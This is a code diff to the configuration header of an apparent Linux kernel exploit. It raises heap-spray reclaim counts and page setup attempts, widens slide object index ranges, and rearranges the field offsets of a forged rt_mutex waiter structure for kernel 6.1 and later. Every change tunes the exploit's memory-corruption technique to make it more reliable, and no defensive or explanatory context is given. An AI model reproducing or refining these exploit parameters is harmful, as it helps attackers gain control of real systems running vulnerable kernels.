@@ -65,14 +65,14 @@
 // RECLAIM / HEAP SPRAY CONFIGS
 // ============================================================================
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
-#define APP_SLIDE_RECLAIM_SENDS 192
+#define APP_SLIDE_RECLAIM_SENDS 384
 #define APP_SLIDE_RECLAIM_SNDBUF 16777216
 #define APP_MM_LATE_DRAIN_TRIGGERS 2
 #define APP_DEFER_FINAL_DRAIN_REAP 1
 #define APP_DEFER_ALL_DRAIN_REAPS 1
 #define APP_QUIET_RECLAIM_WINDOW 1
-#define APP_SLIDE_MIN_OBJECT_INDEX 27
-#define APP_SLIDE_MAX_OBJECT_INDEX 30
+#define APP_SLIDE_MIN_OBJECT_INDEX 5
+#define APP_SLIDE_MAX_OBJECT_INDEX 20
 #define APP_FOPS_MIN_OBJECT_INDEX 24
 #define APP_RECLAIM_MAX_DIRECT_BASE 0xffffff8080000000ULL
 #define APP_PSELECT_TRIGGER_MAX_AGE_USEC 150000
@@ -102,8 +102,8 @@
 #define SLIDE_MAX_ATTEMPTS 32
 
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
-#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 8
-#define APP_SLIDE_FRESH_PAGE_ATTEMPTS 8
+#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 12
+#define APP_SLIDE_FRESH_PAGE_ATTEMPTS 12
 #define APP_FOPS_FRESH_PAGE_ATTEMPTS 8
 #define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 8
 #define DEFAULT_EXPLOIT_ATTEMPTS 1
@@ -219,16 +219,16 @@
 // ============================================================================
 // FAKE WAITER LAYOUT - FORMATO COMPACTO (kernel 6.1+)
 // ============================================================================
-#define COMPACT_RT_MUTEX_WAITER 1
+#define FAKE_WAITER_LAYOUT_SIZE      0x58
 
+#define FAKE_WAITER_TREE_ENTRY_OFF   0x00
 #define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
-#define FAKE_WAITER_TASK_OFF 0x30
-#define FAKE_WAITER_LOCK_OFF 0x38
-#define FAKE_WAITER_WAKE_STATE_OFF 0x40
-#define FAKE_WAITER_PRIO_OFF 0x44
-#define FAKE_WAITER_DEADLINE_OFF 0x48
-#define FAKE_WAITER_WW_CTX_OFF 0x50
-#define FAKE_WAITER_LAYOUT_SIZE 0x58
+#define FAKE_WAITER_TASK_OFF         0x30
+#define FAKE_WAITER_LOCK_OFF         0x38
+#define FAKE_WAITER_WAKE_STATE_OFF   0x40
+#define FAKE_WAITER_PRIO_OFF         0x44
+#define FAKE_WAITER_DEADLINE_OFF     0x48
+#define FAKE_WAITER_WW_CTX_OFF       0x50
 
 // ============================================================================
 // FAKE TASK LAYOUT
